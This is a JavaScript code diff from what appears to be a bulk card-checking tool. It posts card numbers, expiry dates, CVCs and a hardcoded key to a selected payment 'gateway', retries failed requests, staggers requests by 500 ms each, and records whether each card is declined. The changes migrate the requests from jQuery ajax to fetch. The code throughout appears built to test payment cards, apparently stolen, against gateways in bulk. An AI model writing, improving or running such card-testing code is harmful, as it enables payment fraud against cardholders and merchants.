@@ -389,7 +389,7 @@ document.addEventListener('DOMContentLoaded', function() {
             formData.append('card[exp_month]', card.exp_month);
             formData.append('card[exp_year]', normalizedYear);
             formData.append('card[cvc]', card.cvv);
-            formData.append('LUMD', 'a3lhIHJlIGxhd2RlIHlhaGkga2FhYXQgaGFpIGt5YSB0ZXJpIGtpIGR1c3JvIGthIGFwaSB1c2Uga3JuYSAxIGJhYXAga2EgaGFpIHRvIGtodWRrYSBibmEgaWRociBtdCB1c2Uga3Lwn5iC'); // Hardcoded LUMD key
+            formData.append('LUMD', 'a3lhIHJlIGxhd2RlIHlhaGkga2FhYXQgaGFpIGt5YSB0ZXJpIGtpIGR1c3JvIGthIGFwaSB1c2Uga3JuYSAxIGJhYXAga2EgaGFpIHRvIGtodWRrYSBibmEgaWRociBtdCB1c2Uga3Lwn5iC');
 
             // Debug: Log FormData contents
             const formDataEntries = [];
@@ -401,71 +401,80 @@ document.addEventListener('DOMContentLoaded', function() {
             $('#statusLog').text(`Processing card: ${card.displayCard}`);
             console.log(`Starting request for card: ${card.displayCard}`);
 
-            $.ajax({
-                url: selectedGateway,
+            fetch(selectedGateway, {
                 method: 'POST',
-                data: formData,
-                processData: false,
-                contentType: false,
-                timeout: 300000,
-                xhr: function() {
-                    const xhr = new window.XMLHttpRequest();
-                    xhr.upload.addEventListener("progress", function(evt) {
-                        if (evt.lengthComputable) {
-                            const percentComplete = evt.loaded / evt.total;
-                            // You could update a progress bar here if needed
-                        }
-                    }, false);
-                    return xhr;
-                },
-                success: function(response) {
-                    const parsedResponse = parseGatewayResponse(response);
-                    
-                    console.log(`Completed request for card: ${card.displayCard}, Status: ${parsedResponse.status}, Response: ${parsedResponse.message}`);
+                body: formData,
+                signal: controller.signal,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}, statusText: ${response.statusText}`);
+                }
+                return response.text();
+            })
+            .then(data => {
+                let parsedData;
+                try {
+                    parsedData = JSON.parse(data);
+                } catch (e) {
+                    parsedData = data;
+                }
+                const parsedResponse = parseGatewayResponse(parsedData);
+                console.log(`Completed request for card: ${card.displayCard}, Status: ${parsedResponse.status}, Response: ${parsedResponse.message}`);
+                if (parsedResponse.status === 'ERROR') {
+                    Swal.fire({
+                        title: 'Authentication Error',
+                        text: parsedResponse.message,
+                        icon: 'error',
+                        confirmButtonColor: '#ec4899'
+                    });
+                }
+                resolve({
+                    status: parsedResponse.status,
+                    response: parsedResponse.message,
+                    card: card,
+                    displayCard: card.displayCard
+                });
+            })
+            .catch(error => {
+                $('#statusLog').text(`Error on card: ${card.displayCard} - ${error.message}`);
+                console.error(`Error for card: ${card.displayCard}, Error: ${error.message}`);
+
+                if (error.name === 'AbortError') {
+                    resolve(null);
+                    return;
+                }
+
+                let errorResponse = `Declined [Request failed: ${error.message}]`;
+                if (error.message.includes('HTTP error')) {
+                    try {
+                        const errorData = JSON.parse(error.message.split('HTTP error! ')[1]);
+                        const parsedError = parseGatewayResponse(errorData);
+                        errorResponse = parsedError.message;
+                    } catch (e) {
+                        // Use raw error message
+                    }
+                }
+
+                if ((error.message.includes('HTTP error') && error.message.match(/status: (0|5\d{2})/)) && retryCount < MAX_RETRIES && isProcessing) {
+                    setTimeout(() => processCard(card, controller, retryCount + 1).then(resolve), 2000);
+                } else {
                     resolve({
-                        status: parsedResponse.status,
-                        response: parsedResponse.message,
+                        status: 'DECLINED',
+                        response: errorResponse,
                         card: card,
                         displayCard: card.displayCard
                     });
-                },
-                error: function(xhr) {
-                    $('#statusLog').text(`Error on card: ${card.displayCard} - ${xhr.statusText} (HTTP ${xhr.status})`);
-                    console.error(`Error for card: ${card.displayCard}, Status: ${xhr.status}, Text: ${xhr.statusText}, Response: ${xhr.responseText}`);
-                    
-                    let errorResponse = `Declined [Request failed: ${xhr.statusText} (HTTP ${xhr.status})]`;
-                    
-                    if (xhr.responseText) {
-                        try {
-                            const errorJson = JSON.parse(xhr.responseText);
-                            if (errorJson) {
-                                const parsedError = parseGatewayResponse(errorJson);
-                                errorResponse = parsedError.message;
-                            }
-                        } catch (e) {
-                            errorResponse = xhr.responseText;
-                        }
-                    }
-                    
-                    if (xhr.statusText === 'abort') {
-                        resolve(null);
-                    } else if ((xhr.status === 0 || xhr.status >= 500) && retryCount < MAX_RETRIES && isProcessing) {
-                        setTimeout(() => processCard(card, controller, retryCount + 1).then(resolve), 2000);
-                    } else {
-                        resolve({
-                            status: 'DECLINED',
-                            response: errorResponse,
-                            card: card,
-                            displayCard: card.displayCard
-                        });
-                    }
                 }
             });
         });
     }
 
     // Main card processing function
-    function processCards() {
+    async function processCards() {
         if (isProcessing) {
             Swal.fire({
                 title: 'Processing in progress',
@@ -535,6 +544,9 @@ document.addEventListener('DOMContentLoaded', function() {
                 activeRequests++;
                 const controller = new AbortController();
                 abortControllers.push(controller);
+
+                await new Promise(resolve => setTimeout(resolve, requestIndex * 500));
+                requestIndex++;
 
                 processCard(card, controller).then(result => {
                     if (result === null) return;
